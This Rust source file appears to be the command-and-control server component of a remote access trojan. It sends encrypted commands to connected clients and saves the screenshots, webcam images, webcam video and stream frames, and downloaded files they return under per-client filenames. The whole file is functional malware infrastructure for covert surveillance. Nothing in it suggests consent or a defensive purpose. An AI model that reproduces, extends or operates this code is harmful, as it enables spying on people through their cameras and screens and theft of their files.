use std::fs;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use serde_json;
use crate::commands::{Command, Response};
use crate::crypto::{encrypt, decrypt};

pub struct Client {
    pub id: usize,
    pub stream: TcpStream,
}

pub async fn handle_incoming_command(cmd: Command, client: &mut Client, encryption_key: &[u8; 32]) -> bool {
    match serde_json::to_vec(&cmd) {
        Ok(data) => match encrypt(&data, encryption_key) {
            Ok(encrypted) => {
                if client.stream.write_all(&encrypted).await.is_err() {
                    return false;
                }
            }
            Err(e) => {
                println!("Encryption error for client {}: {}", client.id, e);
                return false;
            }
        },
        Err(e) => {
            println!("Serialization error for client {}: {}", client.id, e);
            return false;
        }
    }
    true
}

pub async fn handle_incoming_data(result: Result<usize, std::io::Error>, client: &mut Client, buf: &[u8], encryption_key: &[u8; 32]) -> bool {
    match result {
        Ok(0) => return false,
        Ok(n) => {
            match decrypt(&buf[..n], encryption_key) {
                Ok(decrypted) => {
                    if let Ok(resp) = serde_json::from_slice::<Response>(&decrypted) {
                        match resp {
                            Response::Success(msg) => println!("Client {}: {}", client.id, msg),
                            Response::Data { data, kind } => {
                                let ext = match kind.as_str() {
                                    "screenshot" => "png",
                                    "webcam" => "png",
                                    "download" => "bin",
                                    "webcam_video" => "mp4",
                                    _ if kind.starts_with("webcam_stream") => "png",
                                    _ => "bin",
                                };
                                let filename = format!("client_{}_{}.{}", client.id, kind, ext);
                                if fs::write(&filename, &data).is_ok() {
                                    println!("Client {}: Saved {} to {}", client.id, kind, filename);
                                } else {
                                    println!("Client {}: Failed to save {}", client.id, kind);
                                }
                            }
                            Response::Error(err) => println!("Client {}: Error: {}", client.id, err),
                        }
                    }
                }
                Err(e) => println!("Client {}: Decryption error: {}", client.id, e),
            }
        }
        Err(_) => return false,
    }
    true
}

pub async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>, encryption_key: &[u8; 32]) {
    let mut buf = [0u8; 4096];
    loop {
        tokio::select! {
            Some(cmd) = rx.recv() => {
                if !handle_incoming_command(cmd, &mut client, encryption_key).await {
                    break;
                }
            }
            result = client.stream.read(&mut buf) => {
                if !handle_incoming_data(result, &mut client, &buf, encryption_key).await {
                    break;
                }
            }
        }
    }
    println!("Client {} disconnected", client.id);
}